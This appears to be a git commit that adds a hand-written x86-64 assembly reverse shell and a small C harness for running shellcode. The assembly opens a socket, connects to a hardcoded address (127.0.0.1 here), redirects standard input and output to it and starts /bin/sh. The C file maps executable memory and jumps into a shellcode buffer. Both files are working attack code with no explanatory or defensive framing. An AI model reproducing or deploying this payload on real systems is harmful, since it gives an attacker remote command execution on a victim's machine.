d550281e34806eea9a9d419452544ca65335dcbe
suzume <julesleveillard@gmail.com>
2024-03-06 13:59:55 +0100

    save

---
+++ example/revshell.s
@@ -0,0 +1,60 @@
+section .text
+global _start
+    
+_start: 
+
+    mov dil, 0x02 
+    and rdi, 0x02 
+
+    push -1
+    pop rsi
+    not rsi
+    ;mov rsi, 0x1
+    push -4
+    pop rax
+    xor rax, -1
+
+
+
+
+    ;mov rdx, 0x0
+    shr rdx, 32
+    shr rdx, 32
+    
+    mov rax, 0x29
+    syscall ; creates the socket
+
+    mov rdi, rax
+    sub rsp, 0x80
+
+    
+
+    push QWORD 0x00
+    push DWORD 0x0100007F
+    push WORD 0x5100
+    push WORD 0x02
+
+    mov rsi, rsp
+    mov rdx, 0x10
+    mov rax, 0x2a
+    syscall
+
+    xor rsi, rsi
+    mov rax, 0x21
+    syscall
+    mov rax, 0x21
+    inc rsi
+    syscall
+    mov rax, 0x21
+    inc rsi
+    syscall
+
+    mov rax, '/bin//sh'
+    push rax
+    mov BYTE [rsp+8], 0x00
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx 
+    mov rax, 0x3B
+    syscall
+
---
+++ shelltest/shelltest.c
@@ -0,0 +1,10 @@
+#include <stdio.h>
+#include <string.h>
+#include <sys/mman.h>
+char shellcode[] = "\\x0f\\x05";
+void main() {
+    printf("shellcode length: %u\n", strlen(shellcode));
+    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
+                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
+}
